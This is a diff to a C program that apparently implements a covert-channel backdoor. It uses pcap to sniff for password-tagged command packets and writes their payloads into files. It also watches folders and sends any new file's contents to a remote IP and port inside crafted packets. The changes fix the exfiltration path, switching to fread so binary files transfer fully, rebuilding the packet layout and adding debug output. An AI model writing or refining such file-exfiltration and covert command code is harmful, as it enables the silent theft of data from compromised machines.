@@ -83,6 +83,7 @@ int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char 
 
 	/* Use callback to process packets */
 	pcap_loop(nic_descr, -1, pkt_callback, NULL);
+
 	return 0;
 }
 
@@ -246,8 +247,8 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 			}
 
 			data = strstr(tempCommand, fileName) ;
-			data += strlen(fileName); 
-			datalen = datalen - (data-command);
+			data += strlen(fileName);
+			datalen = datalen - (data - command);
 			//open file and append payload data to file
 			fp = fopen(fileName, "a+b");
 			if(fp==NULL){fprintf(stderr, "file open error\n"); return;}
@@ -376,7 +377,7 @@ int send_file_data(const char* folder, const char * fileName, const char * src_i
 	fp = fopen(filePath, "rb");
 	if(fp==NULL){fprintf(stderr, "file open error."); return -1;}
 	//read file
-	while(fgets(data, PKT_SIZE - 10, fp) != NULL)
+	while(fread(data, 1, PKT_SIZE - 100, fp))
 	{
 		if(count ==0){
 			transferMode = CREATE_MODE;
@@ -386,8 +387,12 @@ int send_file_data(const char* folder, const char * fileName, const char * src_i
 		
 		
 		//Format packet payload
-		sprintf(packet, "%s %d %s%d %d %s %s%s", PASSWORD, CLIENT_MODE, CMD_START, TRANSFER_MODE, transferMode, fileName, data, CMD_END);
+		sprintf(packet, "%s %d %s%d %d %s ", PASSWORD, CLIENT_MODE, CMD_START, TRANSFER_MODE, transferMode, fileName);
+		strcat(packet, data);
+		strcat(packet, CMD_END);
+
 		printf("Packet: %s\n", packet);
+		printf("Packet Size: %d\n", strlen(packet));
 		//Encrypt payload
 		
 		//Send it over to the client
@@ -448,7 +453,8 @@ int initFileMonitor(struct filelist* folder, const char* src_ip, const char* des
 		perror ("Failed to set SIGINT handler");
 		exit (EXIT_FAILURE);
 	}*/
-
+	
+	printf("Start file monitoring\n");
 
 	while (!doneflag)
 	{
@@ -497,8 +503,8 @@ int initFileMonitor(struct filelist* folder, const char* src_ip, const char* des
 					}
 					fileNode = fileNode->next;
 				}
-				printf ("%s\n", tempFolder);
-				send_file_data(tempFolder, event->name, src_ip, dest_ip, dest_port,protocol);
+				printf ("Temp Folder: %s\n", tempFolder);
+				send_file_data(tempFolder, event->name, src_ip, dest_ip, dest_port, protocol);
 			}
 
 
